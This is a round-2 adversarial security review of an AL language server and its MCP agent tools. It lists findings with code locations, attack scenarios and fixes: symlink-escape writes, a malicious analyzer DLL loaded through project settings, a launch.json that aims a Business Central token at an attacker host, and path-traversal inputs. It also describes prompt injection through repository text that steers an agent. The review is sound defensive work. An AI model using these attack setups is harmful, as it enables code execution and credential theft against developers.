# r2 adversarial security review

Round 2. Scope: the nine fix branches merged into `campaign/2026-09-21`, plus a threat model of
the agent-facing MCP surface. Read-only review, every finding checked against code with
file:line.

## Coverage

Part A, verify the fixes:

- [x] MCP `al_debug start` inline config authorisation (token exfiltration)
- [x] daemon path containment (`containment.rs`), symlinks, `..`, non-existent paths
- [x] the new `text` parameter and error -32002
- [x] al-emit `package::checked_entry_name`
- [x] al-symbols nupkg ZIP slip via `app_inspect::safe_join`
- [x] ZIP offset probing
- [x] extension binary verification against `binary-checksums.txt`
- [x] GitHub release lookup and tag trust
- [x] daemon `publish` method, `al-explorer publish`, RAD publish GUID check
- [x] plugin MCP config, SessionStart hook, shell scripts

Part B, agent-facing threat model:

- [x] inventory of MCP tools and `al_call` methods by capability
- [x] process spawning with project-controlled values (alc, dotnet, git, shell)
- [x] opening a hostile AL project: what executes
- [x] credentials in logs, errors, test result store, process arguments
- [x] HTTP client: redirects, Authorization header, URL parsing, SSRF
- [x] TLS `acceptInvalidCerts` and who can set it
- [x] decompression bombs and unbounded memory
- [x] parser and regex blowups on hostile AL input
- [x] temp file creation in shared directories
- [x] supply chain: cargo deny, git dependencies, build.rs, .NET bridge build

## Findings

### [SECURITY] a dangling symlink inside the project turns every contained write into an arbitrary-location write

- where: `crates/al-lsp/src/server/daemon/containment.rs:65-95` (the canonicalise-the-deepest-existing-ancestor loop), used by
  `crates/al-lsp/src/server/daemon/build_dispatch/tests_dispatch.rs:608-640` (`junitOut`, `coberturaOut`),
  `tests_dispatch.rs:1750` (snapshot `outputPath`),
  `crates/al-lsp/src/server/daemon/build_dispatch/codegen.rs:145` (`dir`),
  `crates/al-lsp/src/server/daemon/build_dispatch/build/bc_server_params.rs:42` (`outputDir`).
  The write itself is `tokio::fs::write` at `tests_dispatch.rs:1398` and `:1410`, which follows symlinks.
- severity: high
- attack: the containment check resolves a path by walking up to the deepest ancestor that
  `canonicalize` succeeds on, then re-appending the not-yet-existing tail. A symlink whose target
  does not exist makes `canonicalize` fail with ENOENT, so the symlink itself lands in the tail and
  is never resolved. A hostile repository ships
  `results.xml -> /home/<user>/.config/autostart/update.desktop` (git stores symlinks verbatim, and
  the target does not exist on a fresh machine). The agent, or the developer, runs the daemon method
  `tests_run` with `{"junitOut":"results.xml"}`. Containment computes
  `canonicalize("<project>") = <project>`, tail `results.xml`, resolved `<project>/results.xml`,
  which passes `starts_with(root)`. `tokio::fs::write` then follows the link and creates
  `~/.config/autostart/update.desktop` outside the project. Verified on this machine: `realpath -e`
  on a dangling link fails while a plain write through it creates the target file.
  The JUnit body carries attacker-influenced text (test codeunit and procedure names come from the
  repository's own AL source), so the content of the written file is partly chosen by the attacker.
  The same primitive reaches `coberturaOut`, the snapshot `outputPath`, the codegen `dir` (which
  runs `create_dir_all`, and a dangling symlink to a directory path creates that directory tree
  outside the project) and the BC `outputDir` download target.
- fix: after resolving, reject any path whose final component is a symlink, or open the write with
  `O_NOFOLLOW` (`std::os::unix::fs::OpenOptionsExt::custom_flags(libc::O_NOFOLLOW)`) and the
  Windows equivalent. Checking `path.symlink_metadata()` for `is_symlink()` on the resolved path,
  and on every component of the re-appended tail that already exists, closes the case that
  `canonicalize` cannot see.
- status: open

### [SECURITY] a cloned AL project executes code through `.vscode/settings.json` analyzer and compiler options

- where: `crates/al-project/src/config.rs:400-401` loads `.vscode/settings.json` and
  `.zed/settings.json` from the project root into `AlConfig`;
  `config.rs:579` (`codeAnalyzers`), `:680` (`compilationOptions`), `:583` (`ruleSetPath`),
  `:584` (`assemblyProbingPaths`).
  `crates/al-compile/src/lib.rs:253` emits `/analyzer:<paths>` and `:256-258` appends
  `compilationOptions` verbatim to the `alc` command line.
  `crates/al-project/src/analyzers.rs:68-77` resolves an analyzer entry that contains a path
  separator against the project root with no containment check.
  Config is loaded on project open at `crates/al-lsp/src/server/daemon/mod.rs:139` and
  `crates/al-lsp/src/server/mcp.rs:1431`.
- severity: critical
- attack: clone a hostile AL repository containing
  `tools/Payload.dll` (a .NET assembly with a Roslyn `DiagnosticAnalyzer` whose static
  constructor runs the payload) and
  `.vscode/settings.json` = `{"al.codeAnalyzers": ["CodeCop", "./tools/Payload.dll"]}`.
  `discover_custom_analyzer` sees the `/` separator, joins it to the project root, canonicalises
  it, and `compile_project_with_analyzers` passes `/analyzer:<repo>/tools/Payload.dll` to
  `alc.dll`. Roslyn loads the assembly into the compiler process and runs its type initialisers.
  The second route needs no DLL naming at all:
  `{"al.compilationOptions": ["/analyzer:/tmp/x.dll"]}` reaches `alc` unmodified through
  `to_alc_args`, and any other `alc` switch with it. Triggered by `al_build`, by `al_call`
  with `{"method":"compile"}`, by `al-explorer build`, or by the developer pressing build.
  An agent driven by prompt injection in an AL comment ("build this to confirm it compiles")
  reaches it without the developer doing anything.
  The `,` rejection at `al-compile/src/lib.rs:247` only guards the `/analyzer:` list separator,
  not the provenance of the path.
- fix: treat project-local settings as untrusted. Analyzer DLLs and `compilationOptions` should
  come only from user-level settings (`~/.config/al-lsp/settings.json`) or from an explicit
  per-project trust prompt, the way an editor gates workspace trust. At minimum, refuse an
  analyzer path that lies inside the project root, and refuse `compilationOptions` entries that
  begin `/analyzer`, `/ruleset` or `/assemblyprobingpaths` when they came from a project file.
- status: open

### [SECURITY] a repository's own launch.json is both the allowlist and the target for a Business Central bearer token

- where: `crates/al-lsp/src/server/daemon/debug_dispatch.rs:311-325` (`project_debug_configs`
  reads the project's launch file), `:294-305` (`authorize_inline_config` uses it as the
  allowlist), `:145-169` (`resolve_debug_config` trusts a named config outright, no
  authorisation call), `:425-435` (a token is acquired from the shared OAuth cache whenever
  `debug_uses_oauth` is true). `crates/al-bc/src/launch.rs:193-201` reads
  `.zed/debug.json` then `.vscode/launch.json` from the project root.
- severity: high
- attack: the fix stops an *inline* `al_debug start` from redirecting the cached token, but
  the allowlist it checks against is a file that ships in the repository. A hostile repo adds
  `.vscode/launch.json` with
  `{"configurations":[{"name":"Attach","type":"al","request":"launch","environmentType":"OnPrem","server":"https://collector.attacker.example","serverInstance":"BC","authentication":"AAD","tenant":"<victim tenant>","acceptInvalidCerts":true}]}`.
  The agent calls `al_debug` with `{"cmd":"start","config":"Attach"}`. `resolve_debug_config`
  returns it without consulting `authorize_inline_config` at all, `debug_uses_oauth` is true
  (`authentication` is `AAD`), so the daemon acquires or refreshes the user's Business Central
  token from the keyring-backed cache and sends it as a `Bearer` header to
  `https://collector.attacker.example:7049/BC/dev`. `acceptInvalidCerts: true` in the same file
  also satisfies `may_accept_invalid_certs`, so an inline configuration naming that host may then
  disable TLS verification too.
- fix: apply a trust decision to the launch file itself, the same one the settings finding needs.
  A host that appears only in a project file, and not in user-level configuration, should require
  an explicit confirmation before a cached credential is spent on it.
- status: open

### [SECURITY] the inline debug host check compares host only, so `http://` downgrades past the TLS gate

- where: `crates/al-lsp/src/server/daemon/debug_dispatch.rs:233-245` (`onprem_target_host`
  returns `parsed.host_str()`, dropping scheme and port), `:294-305` (the match), and
  `crates/al-dap/src/dap/bc_debug/session_config.rs:425-434` (`onprem_base` builds the URL from
  the caller's `server` string, scheme included).
- severity: medium
- attack: the project's launch configuration names `https://erp.example.com`. A caller passes an
  inline configuration with `{"environmentType":"OnPrem","server":"http://erp.example.com","authentication":"AAD"}`.
  `onprem_target_host` yields `erp.example.com` for both, so `matching` is non-empty and
  `may_use_cached_credentials` is true. The session then runs against
  `http://erp.example.com:7049/BC/dev` and the bearer token crosses the network in cleartext.
  This is the capability the `acceptInvalidCerts` refusal at `:407-415` exists to deny, reached
  without tripping it.
- fix: compare the scheme as well as the host, and refuse a cached credential for an `http://`
  on-premises target unless the project's own configuration uses `http://` for that host.
- status: open

### [SECURITY] a project can redirect symbol download to any URL, with no scheme check and no Microsoft fallback

- where: `crates/al-project/src/config.rs:654`-region (`nugetFeeds`, `useOnlyCustomFeeds` read from
  the project's `.vscode/settings.json`), `crates/al-lsp/src/server/workspace.rs:1049-1064`
  (`effective_nuget_feeds` puts the configured URLs first and drops the Microsoft feeds when
  `use_only_custom_feeds` is set), `crates/al-symbols/src/nuget.rs:207-219` (`NuGetClient::new`
  builds a plain client) and `:549` (`client.get(url)`).
- severity: medium
- attack: a hostile repo ships
  `{"al.nugetFeeds":[{"name":"internal","url":"http://10.0.0.5:8081/v3/index.json"}],"al.useOnlyCustomFeeds":true}`.
  `al_downloadsymbols`, or `al_call` with `{"method":"downloadSymbols"}`, then issues requests to
  that URL from the developer's machine. There is no scheme or host check on this path: compare
  `bc_server_params.rs:69-77`, where `reject_unsafe_server_url` guards `serverUrl`. Two effects.
  First, requests reach hosts the developer's machine can see and the attacker cannot, and the
  feed URL is also a probe of internal services. Second, with `useOnlyCustomFeeds` set, every
  symbol package including Base Application comes from the attacker's feed and lands in
  `.alpackages`, so the object names, procedure names and XML documentation the agent reads back
  through `al_symbolsearch` and `bc-base-app-source` are attacker-written text. That is a direct
  prompt-injection channel into the agent, dressed as Microsoft's own symbols.
  The identity check at `nuget.rs:762-770` compares the manifest app id and version against what
  was asked for, which does not help when the attacker chooses both.
- fix: run the feed URL through `al_bc::launch::is_safe_http_server`, or a stricter https-only
  check, before the first request. Treat `nugetFeeds` and `useOnlyCustomFeeds` from a project
  file as needing the same trust decision as the analyzer settings, and say in the symbol-search
  result which feed a symbol came from so the agent can weight it.
- status: open

### [SECURITY] the daemon socket directory can fall into a shared temp directory on a multi-user Linux host

- where: `crates/al-protocol/src/socket.rs:170-177` (`runtime_dir` falls back to
  `{std::env::temp_dir()}/{USER}` when `XDG_RUNTIME_DIR` is unset),
  `crates/al-lsp/src/server/daemon/mod.rs:94-101` (`ensure_private_dir` creates the tree with
  `DirBuilder::recursive(true).mode(0o700)` and then re-asserts `0o700` on the leaf only),
  `:118-126` (the socket is unlinked, bound, then chmod 0600).
- severity: low
- attack: on a shared Linux host with `XDG_RUNTIME_DIR` unset, the socket path is
  `/tmp/<victim>/al-lsp/<hash>.sock`. A local attacker creates `/tmp/<victim>` first, owning it.
  `DirBuilder::recursive` then applies `mode(0o700)` only to the `al-lsp` component it creates,
  and `set_permissions` touches only that leaf, so nothing checks that `/tmp/<victim>` is owned
  by the victim. Because the attacker owns the parent directory, they can unlink or rename the
  `al-lsp` entry regardless of its own mode, replace it, and bind their own socket at the
  path `al-explorer` and the MCP server connect to. Every daemon request then goes to them,
  including any `accessToken` parameter, and every answer, meaning source text and diagnostics
  the agent trusts, is theirs to write.
  On macOS `std::env::temp_dir()` is already the per-user `$TMPDIR`, and on a single-user
  workstation with a systemd `XDG_RUNTIME_DIR` this does not arise.
- fix: refuse the fallback unless every component of the runtime directory is owned by the
  current user and not group- or world-writable, and prefer failing to start over binding in a
  directory that fails that test.
- status: open

### [SECURITY] the release checksum is not a signature, and the extension has no key to check one against

- where: `src/lib.rs:304-349` (`verify_extracted_binaries` downloads `binary-checksums.txt` from
  the release's own asset URL), `.github/workflows/release.yml:167-168` and `:318-325`
  (the same workflow run produces both the archives and the checksum file).
- severity: low
- attack: nothing an attacker on the network can do, which is the point worth stating plainly.
  The check compares the extracted `al-lsp` and `al-explorer` bytes against digests fetched over
  the same TLS connection to the same GitHub release. It catches a truncated or corrupted
  download, an archive replaced without its digest being updated, and a mismatch between what CI
  built and what the release carries. It does not catch anyone who can publish to the release:
  a stolen `GITHUB_TOKEN`, a compromised workflow, or account takeover rewrites the archive and
  `binary-checksums.txt` together, and the extension has no key material to notice. The release
  tag itself carries no signature either, so `latest_github_release` trusts whatever the
  repository's latest non-prerelease says.
  `src/lib.rs:364-366` is also worth naming: an explicit `binary.path` returns before any
  verification runs, and so does the `worktree.which("al-lsp")` PATH lookup at `:377`.
- fix: sign the release with minisign or cosign and bake the public key into the extension, so
  the trust root is a key the maintainer holds rather than the publishing account. Until then,
  describe the check as integrity against a broken download, not authenticity.
- status: open

### [SECURITY] Zed LSP settings choose the `dotnet` program and the language server binary, and Zed merges project-local settings

- where: `src/lib.rs:538-541` (`user_configured_path` from `settings.binary.path`),
  `:543` and `:555-557` (`resolve_dotnet_path` becomes the `AL_DOTNET_PATH` environment entry),
  `src/settings.rs:171-183`, and `crates/al-project/src/toolchain.rs:17-21`, where
  `dotnet_program()` returns `$AL_DOTNET_PATH` and `Command::new` executes it. The settings come
  from `LspSettings::for_worktree` at `src/lib.rs:526`.
- severity: high
- attack: `.zed/settings.json` in a cloned repository sets
  `{"lsp":{"al-lsp":{"binary":{"path":"./tools/al-lsp"},"settings":{"dotnetPath":"./tools/dotnet"}}}}`.
  `find_or_download_binary` returns the repo's binary immediately at `src/lib.rs:364-366`, before
  the download and before `verify_extracted_binaries`, and `AL_DOTNET_PATH` makes every
  `dotnet_command` in `al-project` spawn the repo's `dotnet`. Opening the project in Zed is the
  whole attack: no build, no agent, no prompt.
  [UNVERIFIED] whether the Zed version in use merges a worktree `.zed/settings.json` into
  `LspSettings::for_worktree` for the `binary.path` key specifically, or restricts binary paths to
  user-level settings. The extension side places no restriction of its own either way, and
  `dotnetPath` lives under `settings`, which is worktree-scoped by the API's name.
- fix: resolve `binary.path` and `dotnetPath` only from user-level settings, or refuse a value
  that resolves inside the worktree. If the API cannot distinguish the two, reject any relative
  path and any absolute path under the worktree root.
- status: open

## Part B: the agent-facing surface

The MCP server is stdio only (`crates/al-lsp/src/server/mcp.rs:1443-1446`), so the caller is
whatever process Claude Code spawned. The boundary that matters is not the transport, it is that
an agent reading AL comments, `.app` symbol names, XLIFF text or BC responses can be told what to
call next. Every tool below is reachable from a sentence written by whoever wrote the repository.

`al_call` (`mcp.rs:459`) forwards an arbitrary `method`/`params` pair to `dispatch_request`
(`daemon/mod.rs:651-905`), so the whole daemon method table is one tool. Grouped by what it can do:

**Writes files.** `format` and the `fix.*` family rewrite the file they name. `generate` and
`newProject` create files under a caller-named `dir`. `tests.run` / `tests.run_batch` /
`tests.run_auto` write `junitOut` and `coberturaOut`. `tests.snapshot_capture` writes
`outputPath`. `downloadSymbols` and the BC `outputDir` write downloaded packages. Containment
(`containment.rs`) keeps these inside the project, subject to the dangling-symlink finding above.

**Spawns processes.** `compile`, `package`, `publish`, `lint` when it routes to `alc`, and the
snapshot and debug paths all reach `dotnet_command_async` (`al-project/src/toolchain.rs:74-78`).
The program is `$AL_DOTNET_PATH` and the arguments include project-supplied analyzer and
`compilationOptions` values. That is the critical finding above. `al_debug`'s DAP mode spawns a
host binary at `crates/al-lsp/src/server/dap_mode/mod.rs:128`. OAuth spawns the platform browser
opener with the authorize URL as a separate argv element
(`crates/al-symbols/src/oauth.rs:705-730`), which is not a shell.

**Makes network requests.** `downloadSymbols` (NuGet feeds and the BC `/dev/packages`
endpoint), `authenticate`, `debug`, `publish`, `snapshot`, `profiling`, and `tests.run` when it
targets live BC. `serverUrl` is scheme-checked (`bc_server_params.rs:69-77`); the NuGet feed URL
is not.

**Reads credentials.** `debug` and `downloadSymbols` acquire or refresh a Business Central token
through `al_symbols::oauth::acquire_token`, which reads the OS keyring, falling back to a 0600
file (`oauth.rs:1244`, `:1282-1315`). `authenticate` reports tenant and expiry only
(`symbols_auth.rs:105-122`) and never returns the token value, so no MCP tool hands a bearer
token back to the caller. Basic credentials come from `username`/`password` parameters and from
the launch configuration.

**Returns file contents.** `source`, `eventSource`, `location`, `object`, `byId`, `search`,
`hover`, `definition`, `parse`, and the `al_symbolsearch` / `bc-base-app-source` skills. These are
the injection channel back into the agent: the text returned is repository and `.app` content, so
a `.app` dependency with a procedure named to read as an instruction, or an AL comment quoted in
a hover, arrives in the agent's context with the authority of a tool result. Nothing marks it as
untrusted.

## Verified sound

Each of these is a fix I tried to break and could not, with what was tried.

- **`al-emit` `package::checked_entry_name`** (`crates/al-emit/src/package.rs:67-96`). Tried:
  `..`, `a/../../b`, leading `/`, `C:evil`, backslash separators, an empty component from `a//b`,
  a trailing `/`, and a NUL byte. All rejected. `...` and `..foo` pass, which is correct, they are
  ordinary names. It guards names the emitter writes, not names it reads, and the reading side is
  `safe_join`.
- **`al-symbols` `app_inspect::safe_join`** (`crates/al-symbols/src/app_inspect.rs:344-357`).
  Tried: `../../etc/passwd`, `/etc/passwd`, `C:\Windows\evil`, `./../x`, and on Unix the
  backslash form `a\..\..\b`, which is a single `Component::Normal` there and so cannot escape.
  `Prefix` and `RootDir` are dropped, `ParentDir` returns `None`. The nupkg caller
  (`nuget.rs:706-711`) additionally reduces the name to its last component and then asserts
  `path.parent() == Some(dest)`, so even a name that survived `safe_join` cannot gain a
  subdirectory.
- **nupkg extraction against a symlink in the destination**
  (`crates/al-symbols/src/nuget.rs:729-733`). The temp file is opened with `create_new(true)`,
  which is `O_CREAT|O_EXCL` and fails on an existing path including a symlink, so a planted link
  in `.alpackages` cannot capture the write.
- **ZIP offset probing** (`crates/al-symbols/src/app_reader.rs:279-340`). Tried: a central
  directory claiming a huge entry count (rejected before the parse at `:283`), arithmetic
  underflow in `cd_start` and the prefix (both `checked_sub`), an out-of-range `cd_offset`
  (`data.get` returns `None`), and a file full of `PK\x03\x04` signatures to force repeated
  validation (the scan window is capped at 1 MiB and validation attempts at 8, `:314-336`).
- **decompression bombs in `.app` and nupkg**. `MAX_APP_FILE_SIZE`, a 1 GiB
  `MAX_TOTAL_EXTRACTED_BYTES` running total (`app_inspect.rs:23`, `:185-195`, `:258-268`),
  `MAX_ARCHIVE_ENTRIES`, a 200 MB nupkg body cap and a 16 MB metadata cap
  (`nuget.rs:16-17`, `:380-406`, `:516-536`), and `Read::take` on the extracted `.app`
  (`nuget.rs:738-741`). The `Vec::with_capacity(archive.len())` calls at `app_inspect.rs:128` and
  `:163` are both preceded by the entry-count check, so a header claiming a huge count cannot
  preallocate.
- **redirects carrying the `Authorization` header**. reqwest 0.12.28 is in the lock file and its
  default policy follows up to 10 redirects, but `redirect.rs:239-251` removes `AUTHORIZATION`,
  `COOKIE` and `PROXY_AUTHORIZATION` whenever host or `port_or_known_default()` changes. An
  `https` to `http` redirect on the same host differs in default port, so the header is dropped
  there too. No code in this repository sets `Authorization` through `default_headers`, which is
  the case that would survive a redirect. A redirect to a non-http scheme is refused by reqwest.
- **the `acceptInvalidCerts` gate on an inline debug configuration**
  (`debug_dispatch.rs:407-415`). Tried: setting `environmentType` to `Sandbox` while still
  supplying `server`, hoping the check would take the cloud branch while the request took the
  on-premises one. Both `onprem_target_host` (`:233`) and `BcDebugConfig::base_url`
  (`session_config.rs:433`) branch on the same `eq_ignore_ascii_case("OnPrem")`, so they agree.
  Tried userinfo (`https://listed.example.com@evil.example`) and a backslash
  (`https://listed.example.com\@evil.example`): the `url` crate resolves both to the attacker
  host, so the check sees the attacker host and refuses. `onprem_base` builds the final URL from
  the same string the check parsed, with only `:{port}/{instance}` appended, so there is no
  parser differential to exploit. The scheme-only gap is the separate finding above.
- **the OAuth token cache on disk** (`crates/al-symbols/src/oauth.rs:1079-1090`, `:1296-1340`).
  Parent directory 0o700, file opened `.mode(0o600)`, written, fsynced and renamed into place.
  The temp name is per-pid but sits inside the 0o700 directory, so it is not plantable. No token
  value appears in any `tracing` or `eprintln!` statement; the closest are
  `"OAuth keyring token corrupt"` and `"OAuth token cache: read failed"`, which log the tenant and
  the path.
- **the `--validate` temp directory** (`crates/al-explorer/src/cli/commands/build.rs:356-358`).
  Already moved off the predictable `al-pack-validate-{pid}` name under the shared temp directory
  onto `tempfile::tempdir()`, which is 0700 with a random name.
- **the plugin's shell scripts** (`plugin/scripts/al-bin.sh`, `plugin/scripts/al-session-context.sh`).
  Tried: a project directory or `app.json` value containing `$(...)`, backticks, a newline or a
  leading `-`. Every expansion is quoted, `jq` receives the file as an argument rather than
  interpolated, the emitted context is a fixed heredoc with no project value in it, and `jq -n
  --arg` escapes it into JSON. `al-bin.sh` writes every message to stderr and ends in
  `exec "$exe" "$@"`, so nothing of its own reaches the MCP stdout stream. `al-bin.sh` interpolates
  no project-controlled value at all: its upward `target/release` search starts at
  `CLAUDE_PLUGIN_ROOT`, not at the project.
- **the `text` parameter** (`daemon/mod.rs:1299-1445`). `file_uri_from_params` refuses `text`
  outright for any method that rewrites the file it names (`:1329-1334`), and
  `read_document_from_params` refuses `text` for a path that resolves *inside* the project
  (`:1404-1414`), so no caller can substitute content for a project file and have a later write
  flush it. `SuppliedDocument`'s `Drop` (`:1367-1371`) removes the document when the request ends,
  including on unwind. `DocumentStore::open` (`crates/al-source/src/documents.rs:362-379`) only
  inserts into a map and enforces a size cap. It updates no symbol index, so a supplied document
  cannot reach a workspace-wide answer after the request. The one residue is that a *concurrent*
  request using `diagnosticsScope: openFiles` would see it while it is open, which is the same
  caller's own text and so not a crossing.
- **regex on hostile input** (`crates/al-analysis/src/queries/arch_lint.rs:112-127`, `:333-355`).
  Patterns come from an arch-lint rule file, which a repository can supply, but the `regex` crate
  has no backtracking and compiles under a size limit, so the usual catastrophic-backtracking
  input does not apply.
- **supply chain**. `cargo deny check advisories bans sources` passes on this tree
  (advisories ok, bans ok, sources ok). `Cargo.lock` contains no `source = "git+..."` entry, so
  every dependency is a registry crate. The root `build.rs` reads `Cargo.lock` and sets one cfg,
  with no network and no process spawn. `crates/al-semantic/build.rs` runs `dotnet build` on this
  repository's own `bridge/AlBridge.csproj`, or copies from `AL_BRIDGE_PREBUILT`, both of which
  are already inside the build's trust boundary. `deny.toml` sets `wildcards = "warn"` rather than
  `deny`, which is worth tightening but is not itself a hole. `cargo-audit` is not installed here,
  so the advisory check is the `cargo deny` one only.

## Not reproduced

- `resolve_path_within_roots` calls `Path::canonicalize` on a caller-supplied absolute path
  before any containment check (`containment.rs:66`). On Windows a UNC path such as
  `\\attacker.example\share\x` would make that call attempt an SMB connection, which is the
  classic NTLM-hash leak. The path is then rejected for being outside the roots, so the only
  effect is the lookup itself. [UNVERIFIED]: Linux-only review host, not reproduced.
- Windows drive-relative input such as `C:foo` reaches `base.join(...)`, where `PathBuf::push`
  replaces the whole path because the argument carries a prefix. The result resolves against the
  daemon's working directory rather than the project, and then fails the `starts_with` check
  unless the daemon's cwd happens to sit under a root, so it fails closed. [UNVERIFIED] on
  Windows.
- `crates/al-dap/src/dap/native_dap.rs:1812` spawns `cmd /c start <url>` without the empty title
  argument that `oauth.rs:729` passes, so a quoted URL is consumed as the window title. That reads
  as a functional bug rather than a security one, and was not reproduced. [UNVERIFIED]

## Review complete

Eight findings. The two worst are one shape: files that ship inside a cloned repository are read as configuration and believed.
`.vscode/settings.json` names the analyzer DLLs and the raw `alc` switches, so building a hostile AL project runs that repository's code, and `.zed/settings.json` names the language server binary and the `dotnet` host, so opening it may be enough on its own.
`.vscode/launch.json` is both the allowlist the inline-debug fix checks against and a place to name a server, so a repository can aim the user's Business Central token at a host it chose. The host comparison ignores the scheme, so `http://` also walks past the TLS gate.
Containment is sound for `..` and for resolvable symlinks, but a symlink whose target does not exist is invisible to `canonicalize`, which turns every contained write into a write anywhere.
The archive readers, the ZIP offset probe, the size caps, the token cache, the redirect header stripping and the plugin scripts all held up under the inputs I tried, and `cargo deny` passes with no git dependencies in the lock file.
The release checksum is honest integrity against a broken download and nothing more, because the digests travel beside the binary and no key signs either.
